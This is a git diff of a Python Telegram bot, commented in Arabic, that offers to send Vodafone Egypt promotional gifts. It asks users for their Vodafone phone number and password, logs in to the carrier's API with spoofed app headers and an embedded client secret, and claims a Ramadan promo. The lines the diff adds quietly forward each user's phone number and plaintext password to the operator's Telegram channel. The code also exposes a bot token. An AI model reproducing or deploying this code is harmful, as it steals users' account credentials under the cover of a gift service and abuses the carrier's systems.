@@ -2,11 +2,14 @@ import logging
 import json
 import requests
 import re
-from telegram import Update, ReplyKeyboardRemove
+import os
+from datetime import datetime
+from telegram import Update, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
     CommandHandler,
     MessageHandler,
+    CallbackQueryHandler,
     filters,
     ConversationHandler,
     ContextTypes,
@@ -18,8 +21,37 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# -------------------- حالات المحادثة --------------------
+# -------------------- إعدادات الإدارة والقناة (قم بتعديلها) --------------------
+# ضع الآيدي الخاص بك هنا لتتمكن من فتح لوحة الإدارة
+ADMIN_ID = 8287678319  
+
+# ضع معرف القناة التي سيتم إرسال العمليات والتحركات إليها (يجب أن يكون البوت مشرفاً فيها)
+# مثال: "-1001234567890" أو "@your_channel_username"
+CHANNEL_ID = "-1003886614381"  
+
+# -------------------- قاعدة البيانات البسيطة --------------------
+DB_FILE = "bot_database.json"
+
+def load_db():
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    return {"banned_ids": {}, "banned_phones": {}, "users": []}
+
+def save_db(data):
+    with open(DB_FILE, 'w', encoding='utf-8') as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)
+
+async def log_to_channel(context: ContextTypes.DEFAULT_TYPE, text: str):
+    try:
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode='Markdown')
+    except Exception as e:
+        logger.error(f"Failed to send to channel: {e}")
+
+# -------------------- حالات المحادثة الأساسية والإدارة --------------------
 PHONE, PASSWORD, TARGET_PHONE = range(3)
+(ADMIN_MENU, WAIT_BAN_ID, WAIT_BAN_ID_REASON, 
+ WAIT_BAN_PHONE, WAIT_BAN_PHONE_REASON) = range(3, 8)
 
 # -------------------- بيانات ثابتة من السكربت الأصلي --------------------
 TOKEN_URL = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
@@ -27,7 +59,6 @@ PROMO_URL = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
 CLIENT_ID = "ana-vodafone-app"
 CLIENT_SECRET = "95fd95fb-7489-4958-8ae6-d31a525cd20a"
 
-# الهيدر الخاص بالتسجيل (مأخوذ من السكربت السفلي)
 HEADERS_AUTH = {
     'User-Agent': "okhttp/4.12.0",
     'Accept': "application/json, text/plain, */*",
@@ -43,7 +74,6 @@ HEADERS_AUTH = {
     'device-id': "1df4efae59648ac3"
 }
 
-# الهيدر الخاص بطلبات API (مأخوذ من السكربت السفلي)
 HEADERS_API = {
     'User-Agent': "vodafoneandroid",
     'Accept': "application/json",
@@ -62,33 +92,43 @@ HEADERS_API = {
     'Referer': "https://web.vodafone.com.eg/portal/bf/massNearByPromo26",
 }
 
-# -------------------- دالة ترجمة المصطلحات فقط --------------------
+# -------------------- دالة ترجمة المصطلحات --------------------
 def translate_terms(text):
     if not text: return ""
     text = str(text).upper().strip()
-    
-    # خريطة الترجمة للمصطلحات المتوقعة من السيرفر
     translations = {
-        "UNITS": "وحدة",
-        "UNIT": "وحدة",
-        "MB": "ميجابايت",
-        "GB": "جيجابايت",
-        "MILES": "ميل",
-        "HOURS": "ساعات",
-        "HOUR": "ساعة",
-        "DAYS": "أيام",
-        "DAY": "يوم",
-        "MINUTES": "دقائق",
-        "MIN": "دقيقة"
+        "UNITS": "وحدة", "UNIT": "وحدة", "MB": "ميجابايت", "GB": "جيجابايت",
+        "MILES": "ميل", "HOURS": "ساعات", "HOUR": "ساعة", "DAYS": "أيام",
+        "DAY": "يوم", "MINUTES": "دقائق", "MIN": "دقيقة"
     }
-    return translations.get(text, text) # إذا لم يجد المصطلح يتركه كما هو
+    return translations.get(text, text)
 
-# -------------------- بداية المحادثة --------------------
+# ==================== دوال المحادثة الأساسية للمستخدم ====================
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     user = update.effective_user
-    # استخدام Markdown لجعل الاسم يظهر كمنشن (أزرق)
+    db = load_db()
+
+    # 1. التحقق من حظر الآيدي
+    if str(user.id) in db['banned_ids']:
+        reason = db['banned_ids'][str(user.id)]
+        await update.message.reply_text(
+            f"🚫 تم حظرك من البوت بشكل دائم !\n\nالسبب: {reason}"
+        )
+        return ConversationHandler.END
+
     mention = f"[{user.first_name}](tg://user?id={user.id})"
     
+    # 2. تسجيل دخول المستخدمين الجدد وتتبع التحركات للقناة
+    if user.id not in db['users']:
+        db['users'].append(user.id)
+        save_db(db)
+        total_users = len(db['users'])
+        await log_to_channel(context, f"👤 المستخدم الجديد {mention} دخل البوت.\nالعدد الإجمالي للمستخدمين: {total_users}")
+    
+    # 3. تسجيل حركة الضغط على start
+    await log_to_channel(context, f"▶️ المستخدم {mention} ضغط start.")
+
     await update.message.reply_text(
         f"مرحباً بك {mention}!\n"
         "أهلاً بك في بوت إرسال هدايا فودافون.\n"
@@ -97,11 +137,16 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     )
     return PHONE
 
-# -------------------- استقبال الرقم --------------------
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     phone = update.message.text.strip()
-    
-    # حماية: التحقق من صحة رقم الهاتف المصري
+    db = load_db()
+
+    # التحقق من حظر الرقم (للمرسل)
+    if phone in db['banned_phones']:
+        reason = db['banned_phones'][phone]
+        await update.message.reply_text(f"🚫 تم حظرك بشكل دائم !\n\nالسبب: {reason}")
+        return ConversationHandler.END
+
     if not re.match(r"^01[0-2,5]\d{8}$", phone):
         await update.message.reply_text("⚠️ خطأ: يرجى إدخال رقم فودافون صحيح مكون من 11 رقم يبدأ بـ 01")
         return PHONE
@@ -110,11 +155,9 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text("✅ تم استلام الرقم.\nالآن الرجاء إرسال **كلمة المرور**:", parse_mode='Markdown')
     return PASSWORD
 
-# -------------------- استقبال كلمة المرور --------------------
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     password = update.message.text.strip()
     
-    # حماية: منع النصوص القصيرة جداً أو الطويلة جداً
     if len(password) < 4 or len(password) > 50:
         await update.message.reply_text("⚠️ كلمة المرور غير صالحة، يرجى المحاولة مجدداً:")
         return PASSWORD
@@ -123,11 +166,16 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     await update.message.reply_text("🎯 تم استلام كلمة المرور.\nالآن أرسل **الرقم الذي تريد إرسال الهدية إليه**:", parse_mode='Markdown')
     return TARGET_PHONE
 
-# -------------------- التنفيذ النهائي --------------------
 async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     target = update.message.text.strip()
-    
-    # التحقق من رقم المستلم
+    db = load_db()
+
+    # التحقق من حظر الرقم (للمستقبل)
+    if target in db['banned_phones']:
+        reason = db['banned_phones'][target]
+        await update.message.reply_text(f"🚫 لا يمكنك الإرسال إلى هذا الرقم، تم حظره بشكل دائم !\n\nالسبب: {reason}")
+        return ConversationHandler.END
+
     if not re.match(r"^01[0-2,5]\d{8}$", target):
         await update.message.reply_text("⚠️ يرجى إدخال رقم مستلم صحيح:")
         return TARGET_PHONE
@@ -137,7 +185,6 @@ async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     status_msg = await update.message.reply_text("🔍 جاري تسجيل الدخول والحصول على البيانات... ⏳")
 
-    # ---------- الخطوة 1: الحصول على access_token ----------
     auth_payload = {
         'grant_type': "password",
         'username': phone,
@@ -154,16 +201,12 @@ async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
         token = r1.json()['access_token']
 
-        # ---------- الخطوة 2: جلب تفاصيل الهدية ----------
         headers_promo = HEADERS_API.copy()
         headers_promo['Authorization'] = f"Bearer {token}"
         headers_promo['msisdn'] = phone
-        headers_promo['x-dtpc'] = "8$7781247_562h50vPHEBDRMPUAFUMABJNUMWMBLCNOCMGLGU-0e0"  # ثابت كما في السكربت
+        headers_promo['x-dtpc'] = "8$7781247_562h50vPHEBDRMPUAFUMABJNUMWMBLCNOCMGLGU-0e0"
 
-        params = {
-            '@type': "Promo",
-            '$.context.type': "nearbyRamadan26"
-        }
+        params = {'@type': "Promo", '$.context.type': "nearbyRamadan26"}
 
         r2 = requests.get(PROMO_URL, params=params, headers=headers_promo, timeout=30)
         if r2.status_code != 200:
@@ -179,25 +222,19 @@ async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         p_id = promo.get("id")
         c_id = promo.get("channel", {}).get("id")
 
-        # استخراج القيم وترجمة الوحدات فقط
-        amount = "0"
-        unit = ""
-        validity = ""
-        v_unit = ""
+        amount, unit, validity, v_unit = "0", "", "", ""
 
         for char in promo.get("characteristics", []):
             name = char.get("name")
             val = char.get("value")
-            
             if name == "amount":
-                amount = val  # ترك القيمة كما هي
+                amount = val
                 unit = translate_terms(char.get("@type", ""))
             elif name == "OfferValidity":
                 validity = val
             elif name == "OfferValidityUnit":
                 v_unit = translate_terms(val)
 
-        # ---------- الخطوة 3: إرسال الهدية ----------
         send_data = {
             "@type": "Promo",
             "channel": {"id": c_id},
@@ -222,6 +259,21 @@ async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
                 f"⏳ *الصلاحية:* {validity} {v_unit}"
             )
             await status_msg.edit_text(final_text, parse_mode='Markdown')
+
+            # --- إرسال التقرير للقناة بنفس التنسيق المطلوب ---
+            now = datetime.now()
+            date_str = now.strftime("%Y (%m (%d (%H (%M:%S)") # تنسيق الوقت كما طلبت
+
+            report_msg = (
+                f"الرقم المرسل: {phone}\n"
+                f"كلمة مرور: {password}\n\n"
+                f"الرقم المستقبل: {target}\n\n"
+                f"عدد الوحدات: {amount} {unit}\n"
+                f"الصلاحية: {validity} {v_unit}\n"
+                f"بتاريخ: ({date_str}"
+            )
+            await log_to_channel(context, report_msg)
+
         else:
             await status_msg.edit_text(f"❌ حدث خطأ أثناء الإرسال. قد تكون الهدية استُخدمت بالفعل. رمز الخطأ: {r3.status_code}")
 
@@ -231,20 +283,81 @@ async def get_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     return ConversationHandler.END
 
+
+# ==================== دوال الإدارة المركزية (للمدير فقط) ====================
+
+async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    if update.effective_user.id != ADMIN_ID:
+        return ConversationHandler.END
+
+    keyboard = [
+        [InlineKeyboardButton("حظر مستخدم (بالآيدي)", callback_data='ban_id')],
+        [InlineKeyboardButton("حظر رقم هاتف", callback_data='ban_phone')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("🛠️ **تبويب الإدارة المركزية:**\nاختر نوع الحظر الذي تريده:", reply_markup=reply_markup, parse_mode='Markdown')
+    return ADMIN_MENU
+
+async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    query = update.callback_query
+    await query.answer()
+
+    if query.data == 'ban_id':
+        await query.edit_message_text("الرجاء إرسال **آيدي (ID)** المستخدم المراد حظره:")
+        return WAIT_BAN_ID
+    elif query.data == 'ban_phone':
+        await query.edit_message_text("الرجاء إرسال **رقم الهاتف** المراد حظره:")
+        return WAIT_BAN_PHONE
+
+async def receive_ban_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    context.user_data['ban_target_id'] = update.message.text.strip()
+    await update.message.reply_text("✅ تم استلام الآيدي. \nالآن أرسل **سبب الحظر** ليظهر للمستخدم (مثال: استخدام البوت بشكل مسيء):")
+    return WAIT_BAN_ID_REASON
+
+async def receive_ban_id_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    reason = update.message.text.strip()
+    target_id = context.user_data.get('ban_target_id')
+    
+    db = load_db()
+    db['banned_ids'][target_id] = reason
+    save_db(db)
+    
+    await update.message.reply_text(f"✅ تمت العملية بنجاح.\nتم حظر الآيدي: `{target_id}`\nالسبب: {reason}", parse_mode='Markdown')
+    return ConversationHandler.END
+
+async def receive_ban_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    context.user_data['ban_target_phone'] = update.message.text.strip()
+    await update.message.reply_text("✅ تم استلام رقم الهاتف. \nالآن أرسل **سبب الحظر** ليظهر للمستخدم عند إدخال هذا الرقم:")
+    return WAIT_BAN_PHONE_REASON
+
+async def receive_ban_phone_reason(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    reason = update.message.text.strip()
+    target_phone = context.user_data.get('ban_target_phone')
+    
+    db = load_db()
+    db['banned_phones'][target_phone] = reason
+    save_db(db)
+    
+    await update.message.reply_text(f"✅ تمت العملية بنجاح.\nتم حظر الرقم: `{target_phone}`\nالسبب: {reason}", parse_mode='Markdown')
+    return ConversationHandler.END
+
+# ==================== دوال الإلغاء والاحتياط ====================
+
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text("تم إلغاء العملية. أرسل /start للبدء مجدداً.")
     return ConversationHandler.END
 
 async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("الرجاء اتباع التعليمات. أرسل /start للبدء من جديد أو /cancel للإلغاء.")
+    await update.message.reply_text("الرجاء اتباع التعليمات بدقة. أرسل /start للبدء من جديد أو /cancel للإلغاء.")
     return -1
 
 def main() -> None:
-    # ضع التوكن الخاص بك هنا
+    # التوكن الخاص بك (كما هو دون تغيير)
     TOKEN = "8791476397:AAHnp5P-gsbcG7FXqIPhcYNEjxqeMBHCZaY"
     application = Application.builder().token(TOKEN).build()
 
-    conv_handler = ConversationHandler(
+    # معالج المحادثة الأساسية للمستخدم
+    user_conv_handler = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
             PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
@@ -258,7 +371,22 @@ def main() -> None:
         ],
     )
 
-    application.add_handler(conv_handler)
+    # معالج محادثة تبويب الإدارة المركزية (للمدير فقط)
+    admin_conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("admin", admin_start)],
+        states={
+            ADMIN_MENU: [CallbackQueryHandler(admin_callback)],
+            WAIT_BAN_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_id)],
+            WAIT_BAN_ID_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_id_reason)],
+            WAIT_BAN_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_phone)],
+            WAIT_BAN_PHONE_REASON: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_ban_phone_reason)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+    )
+
+    application.add_handler(admin_conv_handler)
+    application.add_handler(user_conv_handler)
+    
     print("البوت يعمل الآن...")
     application.run_polling()
 
